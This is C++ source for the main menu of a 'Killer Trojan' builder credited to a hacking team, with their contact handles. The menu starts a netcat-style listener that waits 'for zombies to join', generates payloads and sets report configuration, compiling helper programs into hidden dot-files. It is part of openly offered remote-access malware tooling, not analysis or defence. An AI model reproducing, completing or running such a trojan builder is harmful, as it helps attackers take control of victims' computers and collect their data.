/**

[+] ./ABDO10 - Lakarha Family 
[+] Main Tool (Killer) # 1.1 r 0 BY ABDO10 , Killer Trojan
[+] This a Packages Fetcher only ...
  
**/
#include <iostream>
#include <string>
#include <cstdlib>
using namespace std ; 

	int main(){
	
	string ch ; 
	int c = 0,l = 0;
      
   do {	
	cout << "\n\n\n \t \t \t \t Killer Builder » 1.1 r 0  \n \n" << endl;

	cout << " +> Programmer +> ABDO10 " << endl;
        cout << " +> Lakarha Family(Team) +> ABDO10 * ./lakarha23 * mathio * Yakuza_Dz * Dzx * Milevian Achraf * XpazzoDZ" << endl;
	cout << " +> Tool +> Killer Trojan" << endl;
	cout << " +> Initial Release +> 1.0 r 0" << endl;
	cout << " +> Previous Release +> 1.0 r 1 " << endl;
	cout << " +> Stable Release +> 1.1 r 0 " << endl;
	cout << " +> Contact -> Telegram: https://t.me/abdo10hacker" << endl;   
        cout << "            -> ICQ: 745267487 " << endl;
        cout << "            -> Email: defacerdz@gmail.com\n" << endl;

	//logo
	cout << endl;
	cout << "\t \t \t  ____. __ __.__  .__                " << endl;
	cout << "\t \t \t /    |/ _|__|  | |  |   ___________ " << endl;
	cout << "\t \t \t |      < |  |  | |  | _/ __ \\_  __ \\" << endl;
	cout << "\t \t \t |    |  \\|  |  |_|  |_\\  ___/|  | \\/" << endl;
	cout << "\t \t \t |____|__ \\__|____/____/\\___  >__|   " << endl;
	cout << "\t \t \t         \\/                 \\/       " << endl;
	cout << endl;

 

	// menu of buildings 
	cout << "\n Select From The Menu Below: " << endl; 
	cout << "  [01] Start Listening or (nc -lvp [PORT])" << endl; 
	cout << "  [02] Payloads Generation " << endl; 
	cout << "  [03] Killer Configuration " << endl << endl;  
        cout << "  [99] Exit." << endl; 

	cout << endl << endl << " killer> ";
        cin >> c ;  
        
	switch(c){
	case 1 : 
	cout << "\n [*] Loading..." << endl;  
	system("g++ src/listener.cpp -o pkgs/.lr"); 
        cout << "\n [+] waiting for zombies to join " << endl;
        system("./pkgs/.lr"); 
	cerr << "\n [-] Session Finished !" << endl; 
	break;
        case 2 : 
	// loading services  
	cout << " [*] Loading Menu...\n" << endl;
	system("g++ src/saver.cpp -o pkgs/.saver");
	system("./pkgs/.saver");

	break;
	case 3 :
	cout << " [!] IMPORTANT: if You look Any Errors get [config.h] in red color that means there's no previous Config" << endl; 
	cout << " - Then set it Now \n " << endl; 
	system("g++ src/info.cpp -o pkgs/.info");
	system("./pkgs/.info");

	cout << "\n \n [!] Configger : Please set Your report info , or use [CTRL+C] To Quit!" << endl;
	cout << " [*] Loading..." << endl;  
	system("g++ src/configger.cpp -o pkgs/.configger");
	system("./pkgs/.configger");
 

	break;
        case 99 : 
	cout << " [!] Quitting killer..." << endl;
	l = 1 ; 

	break;
	default:
	cerr << " [-] Killer : "<< c << " Unknown!" << endl;

	}

    }
	while (l != 1) ; 
	
	return 0;

	}

